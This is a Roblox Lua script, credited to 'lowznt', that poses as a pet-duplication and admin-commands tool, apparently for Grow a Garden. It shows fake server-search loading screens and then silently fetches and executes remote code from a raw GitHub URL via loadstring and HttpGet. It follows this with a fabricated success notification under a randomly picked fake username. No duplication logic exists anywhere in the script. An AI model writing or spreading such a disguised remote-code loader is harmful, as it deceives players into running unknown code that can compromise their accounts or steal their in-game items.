-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Cleanup existing GUIs
for _, gui in ipairs(playerGui:GetChildren()) do
    if gui.Name == "CustomGui" or gui.Name == "LoadingScreen" or gui.Name == "ScriptWaitUI" or gui.Name == "NotifHolder" then
        gui:Destroy()
    end
end

-- Notification UI Holder
local notifGui = Instance.new("ScreenGui", playerGui)
notifGui.Name = "NotifHolder"
notifGui.IgnoreGuiInset = true

local notifFrame = Instance.new("Frame", notifGui)
notifFrame.Size = UDim2.new(0, 300, 1, 0)
notifFrame.Position = UDim2.new(1, -310, 0, 0)
notifFrame.BackgroundTransparency = 1

local notifLayout = Instance.new("UIListLayout", notifFrame)
notifLayout.SortOrder = Enum.SortOrder.LayoutOrder
notifLayout.Padding = UDim.new(0, 8)
notifLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom

-- Random name generator
local function getRandomName()
    local names = {"MasterMaker321", "EpicNoob42", "BananaKing", "SussyBaka11", "ZonexYT", "XxTryHardxX"}
    return names[math.random(1, #names)]
end

-- Notification system
local function createNotif(text)
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 0, 40)
    frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    frame.BackgroundTransparency = 1
    frame.Parent = notifFrame
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)

    local lbl = Instance.new("TextLabel", frame)
    lbl.Size = UDim2.new(1, -10, 1, 0)
    lbl.Position = UDim2.new(0, 5, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.TextColor3 = Color3.new(1, 1, 1)
    lbl.Text = text
    lbl.Font = Enum.Font.Gotham
    lbl.TextSize = 18
    lbl.TextXAlignment = Enum.TextXAlignment.Left

    -- Show transition
    TweenService:Create(frame, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()

    -- Auto remove
    task.delay(2, function()
        TweenService:Create(frame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
        wait(0.35)
        frame:Destroy()
    end)
end

-- MAIN GUI
local mainGui = Instance.new("ScreenGui", playerGui)
mainGui.Name = "CustomGui"
mainGui.ResetOnSpawn = false
mainGui.IgnoreGuiInset = true

local frame = Instance.new("Frame", mainGui)
frame.Size = UDim2.new(0, 320, 0, 180)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

local layout = Instance.new("UIListLayout", frame)
layout.Padding = UDim.new(0, 12)
layout.FillDirection = Enum.FillDirection.Vertical
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.VerticalAlignment = Enum.VerticalAlignment.Center

-- BUTTON CREATOR
local function createButton(text)
    local btn = Instance.new("TextButton", frame)
    btn.Size = UDim2.new(0.8, 0, 0, 45)
    btn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    btn.Font = Enum.Font.GothamSemibold
    btn.Text = text
    btn.TextSize = 22
    btn.TextColor3 = Color3.fromRGB(220, 220, 220)
    btn.AutoButtonColor = false
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)

    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 60, 60)}):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(45, 45, 45)}):Play()
    end)

    return btn
end

-- LOADING SCREEN (Fullscreen)
local function showLoadingScreen(message, callback)
    local scr = Instance.new("ScreenGui", playerGui)
    scr.Name = "LoadingScreen"
    scr.IgnoreGuiInset = true

    local bg = Instance.new("Frame", scr)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)

    local box = Instance.new("Frame", bg)
    box.Size = UDim2.new(0.6, 0, 0.3, 0)
    box.Position = UDim2.new(0.5, 0, 0.5, 0)
    box.AnchorPoint = Vector2.new(0.5, 0.5)
    box.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)

    local lbl = Instance.new("TextLabel", box)
    lbl.Size = UDim2.new(0.9, 0, 0.3, 0)
    lbl.Position = UDim2.new(0.5, 0, 0.25, 0)
    lbl.AnchorPoint = Vector2.new(0.5, 0.5)
    lbl.BackgroundTransparency = 1
    lbl.Font = Enum.Font.GothamBold
    lbl.TextColor3 = Color3.fromRGB(240, 240, 240)
    lbl.TextSize = 24
    lbl.TextWrapped = true
    lbl.Text = message

    local percent = Instance.new("TextLabel", box)
    percent.Size = UDim2.new(0, 80, 0, 30)
    percent.Position = UDim2.new(0.5, 0, 0.5, 0)
    percent.AnchorPoint = Vector2.new(0.5, 0.5)
    percent.BackgroundTransparency = 1
    percent.Font = Enum.Font.Gotham
    percent.TextSize = 22
    percent.TextColor3 = Color3.fromRGB(200, 200, 200)
    percent.Text = "0%"

    local bgBar = Instance.new("Frame", box)
    bgBar.Size = UDim2.new(0.8, 0, 0, 10)
    bgBar.Position = UDim2.new(0.5, 0, 0.7, 0)
    bgBar.AnchorPoint = Vector2.new(0.5, 0.5)
    bgBar.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    Instance.new("UICorner", bgBar).CornerRadius = UDim.new(1, 0)

    local bar = Instance.new("Frame", bgBar)
    bar.Size = UDim2.new(0, 0, 1, 0)
    bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)

    local watermark = Instance.new("TextLabel", box)
    watermark.Size = UDim2.new(0.6, 0, 0, 20)
    watermark.Position = UDim2.new(0.5, 0, 0.9, 0)
    watermark.AnchorPoint = Vector2.new(0.5, 0.5)
    watermark.BackgroundTransparency = 1
    watermark.Font = Enum.Font.Gotham
    watermark.TextSize = 14
    watermark.TextColor3 = Color3.fromRGB(150, 150, 150)
    watermark.Text = "Script by lowznt"

    task.spawn(function()
        for i = 1, 100 do
            percent.Text = i .. "%"
            bar:TweenSize(UDim2.new(i/100, 0, 1, 0), "Out", "Quad", 0.05, true)
            wait(5/100)
        end

        -- Fade out
        for _, v in ipairs(box:GetChildren()) do
            if v:IsA("TextLabel") or v:IsA("Frame") then
                TweenService:Create(v, TweenInfo.new(0.5), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
            end
        end
        wait(0.5)
        scr:Destroy()
        callback()
    end)
end

-- Script Wait UI
local function showScriptWait()
    local scr = Instance.new("ScreenGui", playerGui)
    scr.Name = "ScriptWaitUI"
    scr.IgnoreGuiInset = true

    local lbl = Instance.new("TextLabel", scr)
    lbl.Size = UDim2.new(0, 450, 0, 70)
    lbl.Position = UDim2.new(0.5, 0, 0.5, 0)
    lbl.AnchorPoint = Vector2.new(0.5, 0.5)
    lbl.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    lbl.Font = Enum.Font.GothamSemibold
    lbl.TextSize = 28
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.Text = "Please Wait Loading Script"
    Instance.new("UICorner", lbl).CornerRadius = UDim.new(0, 16)

    local running = true
    task.spawn(function()
        while running do
            for d = 0, 3 do
                lbl.Text = "Please Wait Loading Script" .. string.rep(".", d)
                wait(0.5)
            end
        end
    end)

    task.delay(2, function()
        running = false
        scr:Destroy()
    end)
end

-- Handler
local function onClick(isDupe)
    mainGui.Enabled = false

    local msg = isDupe
        and "Finding A Compatible Server to Duplicate, Please Wait…"
        or "Finding a Compatible Server For Admin Commands, Please Wait…"

    showLoadingScreen(msg, function()
        showScriptWait()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
        end)
        createNotif(getRandomName() .. " Successfully Duped a Pet!")
    end)
end

-- Buttons
local adminBtn = createButton("Admin Commands")
adminBtn.MouseButton1Click:Connect(function() onClick(false) end)

local dupeBtn = createButton("Dupe Now!")
dupeBtn.MouseButton1Click:Connect(function() onClick(true) end)
